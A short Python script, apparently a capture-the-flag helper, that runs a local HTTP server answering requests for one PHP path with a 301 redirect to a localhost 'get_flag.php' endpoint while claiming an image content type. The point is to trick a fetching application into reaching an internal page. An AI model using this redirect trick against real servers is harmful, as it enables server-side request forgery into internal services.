from http.server import SimpleHTTPRequestHandler, HTTPServer

class FakeRedirect(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/prova2.php':
            # If the requested path matches your specified file
            self.send_response(301)
            new_path = 'http://localhost/get_flag.php'
            self.send_header('Location', new_path)
            self.send_header('Content-Type', 'image/png')
            self.end_headers()
        else:
            # For all other requests, serve normally
            super().do_GET()

httpd = HTTPServer(('localhost', 8100), FakeRedirect)
print('Server running on port 8100...')
httpd.serve_forever()
